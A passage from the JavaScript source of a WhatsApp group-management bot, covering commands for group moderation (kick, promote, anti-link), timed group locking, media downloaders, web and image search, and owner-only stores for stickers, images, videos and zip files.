            let off = nttoxic.indexOf(from);
            ntwame.splice(off, 1);
            fs.writeFileSync(
              "./database/antiwame.json",
              JSON.stringify(ntwame)
            );
            replygcnhd("Success in turning off antiwame in this group");
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkgc":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (Antilinkgc) return replygcnhd("Already activated");
            ntlinkgc.push(from);
            fs.writeFileSync(
              "./database/antilinkgc.json",
              JSON.stringify(ntlinkgc)
            );
            replygcnhd("Success in turning on antiwame in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!Antilinkgc) return replygcnhd("Already deactivated");
            let off = ntlinkgc.indexOf(from);
            ntlinkgc.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkgc.json",
              JSON.stringify(ntlinkgc)
            );
            replygcnhd("Success in turning off antiwame in this group");
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "leavegc":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await NhdBotFunc.groupLeave(m.chat);
          await replygcnhd(`Done`);
        }
        break;
      case "add":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!NhdTheCreator) return NhdStickOwner();
          let users = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await NhdBotFunc.groupParticipantsUpdate(m.chat, [users], "add");
          await replygcnhd(`Done`);
        }
        break;
      case "closetime":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (args[1] == "second") {
            var timer = args[0] * `1000`;
          } else if (args[1] == "minute") {
            var timer = args[0] * `60000`;
          } else if (args[1] == "hour") {
            var timer = args[0] * `3600000`;
          } else if (args[1] == "day") {
            var timer = args[0] * `86400000`;
          } else {
            return replygcnhd(
              "*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second"
            );
          }
          replygcnhd(`Close Time ${q} Starting from now`);
          setTimeout(() => {
            var nomor = m.participant;
            const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`;
            NhdBotFunc.groupSettingUpdate(from, "announcement");
            replygcnhd(close);
          }, timer);
        }
        break;
      case "ephemeral":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins) return NhdStickAdmin();
          if (!text) return replygcnhd("Enter the value enable/disable");
          if (args[0] === "enable") {
            await NhdBotFunc.sendMessage(m.chat, {
              disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL,
            });
          } else if (args[0] === "disable") {
            await NhdBotFunc.sendMessage(m.chat, {
              disappearingMessagesInChat: false,
            });
            await replygcnhd(`Done`);
          }
        }
        break;
      case "delete":
      case "del":
        {
          if (!m.quoted) throw false;
          let { chat, fromMe, id, isBaileys } = m.quoted;
          if (!isBaileys)
            return replygcnhd("The message was not sent by a bot!");
          NhdBotFunc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: true,
              id: m.quoted.id,
              participant: m.quoted.sender,
            },
          });
        }
        break;
      case "linkgroup":
      case "linkgc":
      case "gclink":
      case "grouplink":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          let response = await NhdBotFunc.groupInviteCode(m.chat);
          NhdBotFunc.sendText(
            m.chat,
            `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`,
            m,
            { detectLink: true }
          );
        }
        break;
      case "opentime":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (args[1] == "second") {
            var timer = args[0] * `1000`;
          } else if (args[1] == "minute") {
            var timer = args[0] * `60000`;
          } else if (args[1] == "hour") {
            var timer = args[0] * `3600000`;
          } else if (args[1] == "day") {
            var timer = args[0] * `86400000`;
          } else {
            return replygcnhd(
              "*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second"
            );
          }
          replygcnhd(`Open Time ${q} Starting from now`);
          setTimeout(() => {
            var nomor = m.participant;
            const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`;
            NhdBotFunc.groupSettingUpdate(from, "not_announcement");
            replygcnhd(open);
          }, timer);
        }
        break;
      case "kick":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await NhdBotFunc.groupParticipantsUpdate(m.chat, [users], "remove");
          await replygcnhd(`Done`);
        }
        break;
      case "setbotname":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!text)
            return replygcnhd(
              `Where is the name?\nExample: ${prefix + command} Cheems Bot`
            );
          await NhdBotFunc.updateProfileName(text);
          replygcnhd(`Success in changing the name of bot's number`);
        }
        break;
      case "setbotbio":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!text)
            return replygcnhd(
              `Where is the text?\nExample: ${prefix + command} Cheems Bot`
            );
          await NhdBotFunc.updateProfileStatus(text);
          replygcnhd(`Success in changing the bio of bot's number`);
        }
        break;
      case "setgroupname":
      case "setsubject":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins) return NhdStickAdmin();
          if (!text) return replygcnhd("Text ?");
          await NhdBotFunc.groupUpdateSubject(m.chat, text);
          await replygcnhd(`Done`);
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins) return NhdStickAdmin();
          if (!text) return replygcnhd("Text ?");
          await NhdBotFunc.groupUpdateDescription(m.chat, text);
          await replygcnhd(`Done`);
        }
        break;
      case "setppgroup":
      case "setgcpp":
      case "setgrouppp":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!quoted) return replygcnhd(`Where is the picture?`);
          if (!/image/.test(mime))
            return replygcnhd(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          if (/webp/.test(mime))
            return replygcnhd(
              `Send/Reply Image With Caption ${prefix + command}`
            );
          var mediz = await NhdBotFunc.downloadAndSaveMediaMessage(
            quoted,
            "ppgc.jpeg"
          );
          if (args[0] == `full`) {
            var { img } = await generateProfilePicture(mediz);
            await NhdBotFunc.query({
              tag: "iq",
              attrs: {
                to: m.chat,
                type: "set",
                xmlns: "w:profile:picture",
              },
              content: [
                {
                  tag: "picture",
                  attrs: { type: "image" },
                  content: img,
                },
              ],
            });
            fs.unlinkSync(mediz);
            replygcnhd(`Success`);
          } else {
            var memeg = await NhdBotFunc.updateProfilePicture(m.chat, {
              url: mediz,
            });
            fs.unlinkSync(mediz);
            replygcnhd(`Success`);
          }
        }
        break;
      case "deleteppgroup":
      case "delppgc":
      case "deleteppgc":
      case "delppgroup":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          await NhdBotFunc.removeProfilePicture(from);
        }
        break;
      case "deleteppbot":
      case "delppbot":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await NhdBotFunc.removeProfilePicture(NhdBotFunc.user.id);
          replygcnhd(`Success in deleting bot's profile picture`);
        }
        break;
      case "promote":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await NhdBotFunc.groupParticipantsUpdate(m.chat, [users], "promote");
          await replygcnhd(`Done`);
        }
        break;
      case "demote":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await NhdBotFunc.groupParticipantsUpdate(m.chat, [users], "demote");
          await replygcnhd(`Done`);
        }
        break;
      case "hidetag":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          NhdBotFunc.sendMessage(
            m.chat,
            { text: q ? q : "", mentions: participants.map((a) => a.id) },
            { quoted: m }
          );
        }
        break;
      case "totag":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!m.quoted)
            return replygcnhd(`Reply message with caption ${prefix + command}`);
          NhdBotFunc.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id),
          });
        }
        break;

      case "tagall":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          me = m.sender;
          let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split("@")[0]}
 🌿 *Message : ${q ? q : "no message"}*\n\n`;
          for (let mem of participants) {
            teks += `${themeemoji} @${mem.id.split("@")[0]}\n`;
          }
          NhdBotFunc.sendMessage(
            m.chat,
            { text: teks, mentions: participants.map((a) => a.id) },
            { quoted: m }
          );
        }
        break;
      case "ebinary":
        {
          if (!q)
            return replygcnhd(
              `Send/reply text with captions ${prefix + command}`
            );
          await NhdStickWait();
          let { eBinary } = require("./scrape/binary");
          let eb = await eBinary(`${q}`);
          replygcnhd(eb);
        }
        break;
      case "dbinary":
        {
          if (!q)
            return replygcnhd(
              `Send/reply text with captions ${prefix + command}`
            );
          await NhdStickWait();
          let { dBinary } = require("./scrape/binary");
          let db = await dBinary(`${q}`);
          replygcnhd(db);
        }
        break;
      case "remini":
        {
          if (!quoted) return replygcnhd(`Where is the picture?`);
          if (!/image/.test(mime))
            return replygcnhd(
              `Send/Reply Photos With Captions ${prefix + command}`
            );
          await NhdStickWait();
          const { remini } = require("./lib/remini");
          let media = await quoted.download();
          let proses = await remini(media, "enhance");
          NhdBotFunc.sendMessage(
            m.chat,
            { image: proses, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "gimage": {
        if (!text)
          return replygcnhd(`Example : ${prefix + command} carry minati`);
        await NhdStickWait();
        let gis = require("g-i-s");
        gis(text, async (error, result) => {
          n = result;
          images = n[Math.floor(Math.random() * n.length)].url;
          NhdBotFunc.sendMessage(
            m.chat,
            {
              image: { url: images },
              caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`,
            },
            { quoted: m }
          );
        });
      }
      case "gimage":
        {
          if (!text)
            return replygcnhd(`Example : ${prefix + command} kaori cicak`);
          nhdezyanu = await fetchJson(
            `https://api.akuari.my.id/search/googleimage?query=${text}`
          );

          n = nhdezyanu.result;

          images = n[Math.floor(Math.random() * n.length)];

          NhdBotFunc.sendMessage(
            m.chat,
            {
              image: { url: images },
              caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`,
            },
            { quoted: m }
          );
        }

        break;
      case "mediafire":
        {
          if (args.length == 0) return replygcnhd(`Where is the link ?`);
          if (!isUrl(args[0]) && !args[0].includes("mediafire.com"))
            return replygcnhd(`The link you provided is invalid`);
          const { mediafireDl } = require("./lib/mediafire.js");
          const baby1 = await mediafireDl(text);
          if (baby1[0].size.split("MB")[0] >= 100)
            return replygcnhd("Oops, the file is too big...");
          const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`;
          replygcnhd(`${result4}`);
          NhdBotFunc.sendMessage(
            m.chat,
            {
              document: { url: baby1[0].link },
              fileName: baby1[0].nama,
              mimetype: baby1[0].mime,
            },
            { quoted: m }
          );
        }
        break;
      case "tiktok":
        {
          if (!q) return replygcnhd(`Example : ${prefix + command} link`);
          if (!q.includes("tiktok")) return replygcnhd(`Link Invalid!!`);
          require("./lib/tiktok")
            .Tiktok(q)
            .then((data) => {
              NhdBotFunc.sendMessage(
                m.chat,
                { caption: `Here you go!`, video: { url: data.watermark } },
                { quoted: m }
              );
            });
        }
        break;
      case "tiktokaudio":
        {
          if (!q) return replygcnhd(`Example : ${prefix + command} link`);
          if (!q.includes("tiktok")) return replygcnhd(`Link Invalid!!`);
          require("./lib/tiktok")
            .Tiktok(q)
            .then((data) => {
              const nhdtikmp3 = { url: data.audio };
              NhdBotFunc.sendMessage(
                m.chat,
                { audio: nhdtikmp3, mimetype: "audio/mp4", ptt: true },
                { quoted: m }
              );
            });
        }
        break;
      case "google":
        {
          if (!q) return replygcnhd(`Example : ${prefix + command} ${botname}`);
          await NhdStickWait();
          let google = require("google-it");
          google({ query: text }).then((res) => {
            let teks = `Google Search From : ${text}\n\n`;
            for (let g of res) {
              teks += `⭔ *Title* : ${g.title}\n`;
              teks += `⭔ *Description* : ${g.snippet}\n`;
              teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`;
            }
            replygcnhd(teks);
          });
        }
        break;
      case "happymod":
        {
          if (!q)
            return replygcnhd(`Example ${prefix + command} Sufway surfer mod`);
          await NhdStickWait();
          let kat = await scp1.happymod(q);
          replygcnhd(util.format(kat));
        }
        break;
      case "search":
      case "yts":
      case "ytsearch":
        {
          if (!text)
            return replygcnhd(`Example : ${prefix + command} story wa anime`);
          let yts = require("yt-search");
          let search = await yts(text);
          let teks = "YouTube Search\n\n Result From " + text + "\n\n";
          let no = 1;
          for (let i of search.all) {
            teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${
              i.type
            }\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${
              i.title
            }\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${
              i.timestamp
            }\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${
              i.url
            }\n\n─────────────────\n\n`;
          }
          NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: search.all[0].thumbnail }, caption: teks },
            { quoted: m }
          );
        }
        break;
      case "xxxxplay":
        {
          if (!text)
            return replygcnhd(`Example : ${prefix + command} story wa anime`);
          await NhdStickWait();
          let search = await yts(text);
          url = search.videos[0].url;
          let anu =
            search.videos[Math.floor(Math.random() * search.videos.length)];
          eek = await getBuffer(anu.thumbnail);
          owned = `${ownernumber}@s.whatsapp.net`;
          ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`;
          NhdBotFunc.sendMessage(
            m.chat,
            { image: eek, caption: ngen },
            { quoted: m }
          );
        }
        break;
      case "play":
      case "song":
        {
          if (!text)
            return replygcnhd(
              `Example : ${prefix + command} anime whatsapp status`
            );
          const nhdplaymp3 = require("./lib/ytdl2");
          let yts = require("youtube-yts");
          let search = await yts(text);
          let anup3k = search.videos[0];
          const pl = await nhdplaymp3.mp3(anup3k.url);
          await NhdBotFunc.sendMessage(
            m.chat,
            {
              audio: fs.readFileSync(pl.path),
              fileName: anup3k.title + ".mp3",
              mimetype: "audio/mp4",
              ptt: true,
              contextInfo: {
                externalAdReply: {
                  title: anup3k.title,
                  body: botname,
                  thumbnail: await fetchBuffer(pl.meta.image),
                  mediaType: 2,
                  mediaUrl: anup3k.url,
                },
              },
            },
            { quoted: m }
          );
          await fs.unlinkSync(pl.path);
        }
        break;
      case "playdoc":
        if (args.length < 1)
          return replygcnhd(
            `Send orders ${command} query\nExample : ${command} adele hello`
          );
        const { yta, ytv } = require("./lib/ytdl");
        await NhdStickWait();
        var dataa = await yts(q);
        dataa = dataa.videos[0].url;
        dataa = dataa.includes("shorts")
          ? dataa.replace("https://youtube.com/shorts/", "https://youtu.be/")
          : dataa;
        yta(dataa)
          .then(async (data) => {
            var teks = `*Youtube Play Music*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* 128p\n*≻ Size :* ${data.filesizeF}\n*≻ Source :* ${q}\n\n_wait a minute sending media..._`;
            if (Number(data.filesize) >= 30000) {
              var res = await axios.get(
                `https://tinyurl.com/api-create.php?url=${data.dl_link}`
              );
              teks = `*Youtube Play Music*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* 128p\n*≻ Size :* ${data.filesizeF}\n*≻ Source :* ${q}\n*≻ Download :* ${res.data}\n\n_for larger sizes, presented in the form of a link_`;
              NhdBotFunc.sendMessage(
                from,
                { image: { url: data.thumb }, caption: teks },
                { quoted: m }
              );
            } else {
              NhdBotFunc.sendMessage(
                from,
                { image: { url: data.thumb }, caption: teks },
                { quoted: m }
              );
              NhdBotFunc.sendMessage(
                from,
                {
                  document: {
                    url: data.dl_link.replace("https://", "http://"),
                  },
                  fileName: `${data.title}.mp3`,
                  mimetype: "audio/mp3",
                },
                { quoted: m }
              );
            }
          })
          .catch(() => replygcnhd(`Error!`));
        break;
      case "ytmp3":
      case "ytaudio": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
        const nhdaudp3 = require("./lib/ytdl2");
        if (args.length < 1 || !isUrl(text) || !nhdaudp3.isYTUrl(text))
          return replygcnhd(
            `Where's the yt link?\nExample: ${
              prefix + command
            } https://youtube.com/shorts/YQf-vMjDuKY?feature=share`
          );
        const audio = await nhdaudp3.mp3(text);
        await NhdBotFunc.sendMessage(
          m.chat,
          {
            audio: fs.readFileSync(audio.path),
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: {
              externalAdReply: {
                title: audio.meta.title,
                body: botname,
                thumbnail: await fetchBuffer(audio.meta.image),
                mediaType: 2,
                mediaUrl: text,
              },
            },
          },
          { quoted: m }
        );
        await fs.unlinkSync(audio.path);
        break;
      case "ytmp4":
      case "ytvideo":
        {
          const nhdvidoh = require("./lib/ytdl2");
          if (args.length < 1 || !isUrl(text) || !nhdvidoh.isYTUrl(text))
            replygcnhd(
              `Where is the link??\n\nExample : ${
                prefix + command
              } https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
            );
          const vid = await nhdvidoh.mp4(text);
          const ytc = `
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`;
          await NhdBotFunc.sendMessage(
            m.chat,
            {
              video: { url: vid.videoUrl },
              caption: ytc,
            },
            { quoted: m }
          );
        }
        break;
      case "ytvxxx":
      case "ytmp4xxx":
      case "mp4xxx":
        {
          if (!text) return replygcnhd("Enter the link!!!");
          await NhdStickWait();
          downloadMp4(text);
        }
        break;
      case "ytaxxx":
      case "ytmp3xxx":
      case "mp3xxx":
        {
          if (!text) return replygcnhd("Enter the link!!!");
          await NhdStickWait();
          downloadMp3(text);
        }
        break;
      case "getcase":
        if (!NhdTheCreator) return NhdStickOwner();
        const getCase = (cases) => {
          return (
            "case" +
            `'${cases}'` +
            fs
              .readFileSync("NhdCheems8.js")
              .toString()
              .split("case '" + cases + "'")[1]
              .split("break")[0] +
            "break"
          );
        };
        replygcnhd(`${getCase(q)}`);
        break;
      case "addprem":
        if (!NhdTheCreator) return NhdStickOwner();
        if (!args[0])
          return replygcnhd(
            `Use ${prefix + command} number\nExample ${
              prefix + command
            } 916909137213`
          );
        prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + `@s.whatsapp.net`;
        let nhdtesx = await NhdBotFunc.onWhatsApp(prrkek);
        if (nhdtesx.length == 0)
          return replygcnhd(
            `Enter a valid and registered number on WhatsApp!!!`
          );
        prem.push(prrkek);
        fs.writeFileSync("./database/premium.json", JSON.stringify(prem));
        replygcnhd(`The Number ${prrkek} Has Been Premium!`);
        break;
      case "delprem":
        if (!NhdTheCreator) return NhdStickOwner();
        if (!args[0])
          return replygcnhd(
            `Use ${prefix + command} nomor\nExample ${
              prefix + command
            } 916909137213`
          );
        ya = q.split("|")[0].replace(/[^0-9]/g, "") + `@s.whatsapp.net`;
        unp = prem.indexOf(ya);
        prem.splice(unp, 1);
        fs.writeFileSync("./database/premium.json", JSON.stringify(prem));
        replygcnhd(`The Number ${ya} Has Been Removed Premium!`);
        break;
      case "addbadword":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Whats the word?");
          if (BadNhd.includes(q))
            return replygcnhd("The word is already in use");
          BadNhd.push(q);
          fs.writeFileSync("./database/bad.json", JSON.stringify(BadNhd));
          replygcnhd(
            `Success Adding Bad Word\nCheck by typing ${prefix}listbadword`
          );
        }
        break;
      case "delbadword":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Enter the word");
          if (!BadNhd.includes(q))
            return replygcnhd("The word does not exist in the database");
          let wanu = BadNhd.indexOf(q);
          BadNhd.splice(wanu, 1);
          fs.writeFileSync("./database/bad.json", JSON.stringify(BadNhd));
          replygcnhd(`Success deleting bad word ${q}`);
        }
        break;
      case "listbadword":
        {
          let teks = "┌──⭓「 *BadWord List* 」\n│\n";
          for (let x of BadNhd) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${BadNhd.length}*`;
          replygcnhd(teks);
        }
        break;
      case "addvideo":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Whats the video name?");
          if (VideoNhd.includes(q))
            return replygcnhd("The name is already in use");
          let delb = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
          VideoNhd.push(q);
          await fsx.copy(delb, `./NhdMedia/video/${q}.mp4`);
          fs.writeFileSync(
            "./NhdMedia/database/nhdvideo.json",
            JSON.stringify(VideoNhd)
          );
          fs.unlinkSync(delb);
          replygcnhd(
            `Success Adding Video\nCheck by typing ${prefix}listvideo`
          );
        }
        break;
      case "delvideo":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Enter the video name");
          if (!VideoNhd.includes(q))
            return replygcnhd("The name does not exist in the database");
          let wanu = VideoNhd.indexOf(q);
          VideoNhd.splice(wanu, 1);
          fs.writeFileSync(
            "./NhdMedia/database/nhdvideo.json",
            JSON.stringify(VideoNhd)
          );
          fs.unlinkSync(`./NhdMedia/video/${q}.mp4`);
          replygcnhd(`Success deleting video ${q}`);
        }
        break;
      case "listvideo":
        {
          let teks = "┌──⭓「 *Video List* 」\n│\n";
          for (let x of VideoNhd) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoNhd.length}*`;
          replygcnhd(teks);
        }
        break;
      case "addimage":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Whats the image name?");
          if (ImageNhd.includes(q))
            return replygcnhd("The name is already in use");
          let delb = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
          ImageNhd.push(q);
          await fsx.copy(delb, `./NhdMedia/image/${q}.jpg`);
          fs.writeFileSync(
            "./NhdMedia/database/nhdimage.json",
            JSON.stringify(ImageNhd)
          );
          fs.unlinkSync(delb);
          replygcnhd(
            `Success Adding Image\nCheck by typing ${prefix}listimage`
          );
        }
        break;
      case "delimage":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Enter the image name");
          if (!ImageNhd.includes(q))
            return replygcnhd("The name does not exist in the database");
          let wanu = ImageNhd.indexOf(q);
          ImageNhd.splice(wanu, 1);
          fs.writeFileSync(
            "./NhdMedia/database/nhdimage.json",
            JSON.stringify(ImageNhd)
          );
          fs.unlinkSync(`./NhdMedia/image/${q}.jpg`);
          replygcnhd(`Success deleting image ${q}`);
        }
        break;
      case "listimage":
        {
          let teks = "┌──⭓「 *Image List* 」\n│\n";
          for (let x of ImageNhd) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageNhd.length}*`;
          replygcnhd(teks);
        }
        break;
      case "addsticker":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Whats the sticker name?");
          if (StickerNhd.includes(q))
            return replygcnhd("The name is already in use");
          let delb = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
          StickerNhd.push(q);
          await fsx.copy(delb, `./NhdMedia/sticker/${q}.webp`);
          fs.writeFileSync(
            "./NhdMedia/database/nhdsticker.json",
            JSON.stringify(StickerNhd)
          );
          fs.unlinkSync(delb);
          replygcnhd(
            `Success Adding Sticker\nCheck by typing ${prefix}liststicker`
          );
        }
        break;
      case "delsticker":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Enter the sticker name");
          if (!StickerNhd.includes(q))
            return replygcnhd("The name does not exist in the database");
          let wanu = StickerNhd.indexOf(q);
          StickerNhd.splice(wanu, 1);
          fs.writeFileSync(
            "./NhdMedia/database/nhdsticker.json",
            JSON.stringify(StickerNhd)
          );
          fs.unlinkSync(`./NhdMedia/sticker/${q}.webp`);
          replygcnhd(`Success deleting sticker ${q}`);
        }
        break;
      case "liststicker":
        {
          let teks = "┌──⭓「 *Sticker List* 」\n│\n";
          for (let x of StickerNhd) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerNhd.length}*`;
          replygcnhd(teks);
        }
        break;
      case "addvn":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Whats the audio name?");
          if (VoiceNoteNhd.includes(q))
            return replygcnhd("The name is already in use");
          let delb = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
          VoiceNoteNhd.push(q);
          await fsx.copy(delb, `./NhdMedia/audio/${q}.mp3`);
          fs.writeFileSync(
            "./NhdMedia/database/nhdvn.json",
            JSON.stringify(VoiceNoteNhd)
          );
          fs.unlinkSync(delb);
          replygcnhd(`Success Adding Audio\nCheck by typing ${prefix}listvn`);
        }
        break;
      case "delvn":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (args.length < 1) return replygcnhd("Enter the vn name");
          if (!VoiceNoteNhd.includes(q))
            return replygcnhd("The name does not exist in the database");
          let wanu = VoiceNoteNhd.indexOf(q);
          VoiceNoteNhd.splice(wanu, 1);
          fs.writeFileSync(
            "./NhdMedia/database/nhdvn.json",
            JSON.stringify(VoiceNoteNhd)
          );
          fs.unlinkSync(`./NhdMedia/audio/${q}.mp3`);
          replygcnhd(`Success deleting vn ${q}`);
        }
        break;
      case "listvn":
        {
          let teks = "┌──⭓「 *VN List* 」\n│\n";
          for (let x of VoiceNoteNhd) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteNhd.length}*`;
          replygcnhd(teks);
        }
        break;
      case "addzip":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await loading();
          if (args.length < 1) return replygcnhd(`What's the zip name?`);
          let teks = `${text}`;
          {
            if (ZipNhd.includes(teks))
              return replygcnhd("This name is already in use");
            let delb = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            ZipNhd.push(teks);
            await fsx.copy(delb, `./NhdMedia/zip/${teks}.zip`);
            fs.writeFileSync(
              "./NhdMedia/database/zip.json",
              JSON.stringify(ZipNhd)
            );
            fs.unlinkSync(delb);
            replygcnhd(`Success Adding zip\nTo check type ${prefix}listzip`);
          }
        }
        break;
      case "delzip":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          await loading();
          if (args.length < 1)
            return replygcnhd("Enter the text in the zip list");
          let teks = `${text}`;
          {
            if (!ZipNhd.includes(teks))
              return replygcnhd("This name does not exist in the database");
            let wanu = ZipNhd.indexOf(teks);
            ZipNhd.splice(wanu, 1);
            fs.writeFileSync(
              "./NhdMedia/database/zip.json",
              JSON.stringify(ZipNhd)
            );
            fs.unlinkSync(`./NhdMedia/zip/${teks}.zip`);
            replygcnhd(`Successfully deleted zip ${teks}`);
          }
        }
        break;
      case "listzip":
        {
          await loading();
          let teksooooo = "┌──⭓「 *ZIP LIST* 」\n│\n";
          for (let x of ZipNhd) {
            teksooooo += `│⭔ ${x}\n`;
          }
